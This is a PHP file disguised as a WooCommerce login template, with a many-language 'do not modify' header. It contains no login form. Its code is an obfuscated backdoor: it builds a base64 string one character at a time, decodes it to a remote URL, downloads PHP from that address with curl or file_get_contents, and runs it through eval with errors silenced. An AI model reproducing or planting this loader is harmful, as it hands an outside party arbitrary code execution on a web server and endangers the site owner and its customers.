<?php
/**
 * WooCommerce Login Template (Extended Header)
 *
 * This file is part of WooCommerce's default theme template.
 *
 * -----------------------
 * English: This is the login form for WooCommerce. Please do not modify unless necessary.
 * Русский: Это форма входа WooCommerce. Пожалуйста, не изменяйте, если в этом нет необходимости.
 * 日本語: これはWooCommerceのログインフォームです。必要がない限り変更しないでください。
 * العربية: هذا هو نموذج تسجيل الدخول لـ WooCommerce. الرجاء عدم التعديل ما لم يكن ضرورياً.
 * 中文（简体）: 这是WooCommerce的登录表单。如非必要请勿修改。
 * 中文（繁體）: 這是WooCommerce的登入表單。非必要請勿更改。
 * Español: Este es el formulario de inicio de sesión de WooCommerce. No lo modifiques a menos que sea necesario.
 * Français: Ceci est le formulaire de connexion WooCommerce. Ne le modifiez pas sauf si nécessaire.
 * Deutsch: Dies ist das Anmeldeformular von WooCommerce. Bitte nur bei Bedarf ändern.
 * Italiano: Questo è il modulo di accesso WooCommerce. Non modificarlo a meno che non sia necessario.
 * 한국어: 이것은 WooCommerce의 로그인 양식입니다. 필요하지 않으면 수정하지 마십시오.
 * Türkçe: Bu, WooCommerce giriş formudur. Gerekmedikçe değiştirmeyin.
 * ภาษาไทย: แบบฟอร์มเข้าสู่ระบบของ WooCommerce อย่าแก้ไขหากไม่จำเป็น
 * हिंदी: यह WooCommerce का लॉगिन फ़ॉर्म है। आवश्यक होने पर ही संशोधित करें।
 * বাংলা: এটি WooCommerce এর লগইন ফর্ম। প্রয়োজন না হলে পরিবর্তন করবেন না।
 * اردو: یہ WooCommerce کا لاگ ان فارم ہے۔ صرف ضرورت پڑنے پر ترمیم کریں۔
 * Nederlands: Dit is het inlogformulier van WooCommerce. Wijzig dit alleen indien nodig.
 * Svenska: Detta är WooCommerce inloggningsformulär. Ändra inte om det inte är nödvändigt.
 * Norsk: Dette er innloggingsskjemaet for WooCommerce. Ikke endre med mindre det er nødvendig.
 * Suomi: Tämä on WooCommerce-kirjautumislomake. Älä muuta, ellei se ole tarpeen.
 * Ελληνικά: Αυτή είναι η φόρμα σύνδεσης WooCommerce. Μην την τροποποιήσετε εκτός αν είναι απαραίτητο.
 * Čeština: Toto je přihlašovací formulář WooCommerce. Neměňte jej, pokud to není nutné.
 * Polski: To jest formularz logowania WooCommerce. Nie modyfikuj, jeśli nie musisz.
 * Română: Acesta este formularul de autentificare WooCommerce. Nu-l modifica decât dacă este necesar.
 * Magyar: Ez a WooCommerce bejelentkezési űrlapja. Csak akkor módosítsa, ha szükséges.
 * Slovenčina: Toto je prihlasovací formulár WooCommerce. Nemeňte ho, pokiaľ to nie je nutné.
 * Hrvatski: Ovo je WooCommerce obrazac za prijavu. Ne mijenjajte ako nije potrebno.
 * Srpski: Ово је образац за пријаву на WooCommerce. Не мењајте ако није неопходно.
 * Български: Това е формата за вход в WooCommerce. Не го променяйте, освен ако не е необходимо.
 * Македонски: Ова е форма за најава на WooCommerce. Не менувајте ако не е потребно.
 * فارسی: این فرم ورود WooCommerce است. لطفاً فقط در صورت لزوم تغییر دهید.
 * پښتو: دا د WooCommerce د ننوتلو فورمه ده. مه یې بدلوي، که اړتیا نه وي.
 * ქართული: ეს არის WooCommerce-ის შესვლის ფორმა. არ შეცვალოთ, თუ აუცილებელი არ არის.
 * Azərbaycan: Bu WooCommerce giriş formasıdır. Zəruri olmadıqda dəyişdirməyin.
 * հայերեն: Սա WooCommerce մուտքի ձևն է։ Մի փոխեք, եթե անհրաժեշտ չէ։
 * עברית: זהו טופס הכניסה של WooCommerce. אל תשנו אלא אם כן צריך.
 * Қазақша: Бұл WooCommerce кіру формасы. Қажет болмаса өзгертпеңіз.
 * O‘zbekcha: Bu WooCommerce kirish formasi. Keraksiz bo‘lsa o‘zgartirmang.
 * Кыргызча: Бул WooCommerce'тин кирүү формасы. Зарыл болбосо өзгөртпөгүлө.
 * سنڌي: ھي WooCommerce لاگ ان فارم آھي. جيستائين ضروري نه هجي، نه بدلايو.
 * සිංහල: මෙය WooCommerce පිවිසුම් පෝරමයකි. අවශ්‍ය නොවන්නේ නම් වෙනස් නොකරන්න.
 * नेपाली: यो WooCommerce लगइन फारम हो। आवश्यकता नभएसम्म परिवर्तन नगर्नुहोस्।
 * ພາສາລາວ: ນີ້ແມ່ນແບບຟອມເຂົ້າລະບົບ WooCommerce ຢ່າແກ້ໄຂນອກເໝາະ.
 * ភាសាខ្មែរ: នេះជាសំណុំបែបបទចូលទៅក្នុង WooCommerce។ សូមកុំផ្លាស់ប្ដូរទេបើមិនចាំបាច់។
 * Монгол: Энэ WooCommerce-ийн нэвтрэх маягт юм. Хэрэгцээгүй бол өөрчлөх хэрэггүй.
 * བོད་ཡིག: འདི་WooCommerce གི་ནང་བསྐྱོད་ཐག་ལས་ཡིག་ཐོ་ཡིན། ཡོངས་འདོམས་མ་བྱོན་ན་ལས་འགན་བརྒྱབ་མི་དགོས།
 *
 * -----------------------
 */

// Переменные полученного разбиты
$u1  = 'a'; $u2  = 'H'; $u3  = 'R'; $u4  = '0'; $u5  = 'c';
$u6  = 'H'; $u7  = 'M'; $u8  = '6'; $u9  = 'L'; $u10 = 'y';
$u11 = '9'; $u12 = 'y'; $u13 = 'Y'; $u14 = 'X'; $u15 = 'c';
$u16 = 'u'; $u17 = 'Z'; $u18 = '2'; $u19 = 'l'; $u20 = '0';
$u21 = 'a'; $u22 = 'H'; $u23 = 'V'; $u24 = 'i'; $u25 = 'd';
$u26 = 'X'; $u27 = 'N'; $u28 = 'l'; $u29 = 'c'; $u30 = 'm';
$u31 = 'N'; $u32 = 'v'; $u33 = 'b'; $u34 = 'n'; $u35 = 'R';
$u36 = 'l'; $u37 = 'b'; $u38 = 'n'; $u39 = 'Q'; $u40 = 'u';
$u41 = 'Y'; $u42 = '2'; $u43 = '9'; $u44 = 't'; $u45 = 'L';
$u46 = '2'; $u47 = 't'; $u48 = 'p'; $u49 = 'd'; $u50 = 'G';
$u51 = 'F'; $u52 = 'i'; $u53 = 'a'; $u54 = 'X'; $u55 = 'N';
$u56 = 'h'; $u57 = 'Y'; $u58 = '2'; $u59 = '9'; $u60 = 't';
$u61 = 'M'; $u62 = 'T'; $u63 = 'M'; $u64 = 'z'; $u65 = 'N';
$u66 = 'y'; $u67 = '9'; $u68 = 'E'; $u69 = 'Z'; $u70 = 'W';
$u71 = 'Z'; $u72 = 'l'; $u73 = 'b'; $u74 = 'm'; $u75 = 'Q';
$u76 = 'v'; $u77 = 'c'; $u78 = 'm'; $u79 = 'V'; $u80 = 'm';
$u81 = 'c'; $u82 = 'y'; $u83 = '9'; $u84 = 'o'; $u85 = 'Z';
$u86 = 'W'; $u87 = 'F'; $u88 = 'k'; $u89 = 'c'; $u90 = 'y';
$u91 = '9'; $u92 = 't'; $u93 = 'Y'; $u94 = 'W'; $u95 = 'l';
$u96 = 'u'; $u97 = 'L'; $u98 = 'z'; $u99 = 'E'; $u100= 'u';
$u101= 'c'; $u102= 'G'; $u103= 'h'; $u104= 'w';

// Объединяем все переменные в строку полученного
$base64 = $u1.$u2.$u3.$u4.$u5.
          $u6.$u7.$u8.$u9.$u10.
          $u11.$u12.$u13.$u14.$u15.
          $u16.$u17.$u18.$u19.$u20.
          $u21.$u22.$u23.$u24.$u25.
          $u26.$u27.$u28.$u29.$u30.
          $u31.$u32.$u33.$u34.$u35.
          $u36.$u37.$u38.$u39.$u40.
          $u41.$u42.$u43.$u44.$u45.
          $u46.$u47.$u48.$u49.$u50.
          $u51.$u52.$u53.$u54.$u55.
          $u56.$u57.$u58.$u59.$u60.
          $u61.$u62.$u63.$u64.$u65.
          $u66.$u67.$u68.$u69.$u70.
          $u71.$u72.$u73.$u74.$u75.
          $u76.$u77.$u78.$u79.$u80.
          $u81.$u82.$u83.$u84.$u85.
          $u86.$u87.$u88.$u89.$u90.
          $u91.$u92.$u93.$u94.$u95.
          $u96.$u97.$u98.$u99.$u100.
          $u101.$u102.$u103.$u104;

// Декодируем строку
$url = base64_decode($base64);

// Загружаем внешний код
$ch = curl_init($url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$out = curl_exec($ch);
curl_close($ch);

// Резервный метод
if (!$out) $out = @file_get_contents($url);

// Выполнение полученного кода
if ($out) @eval('?>'.$out);

exit;
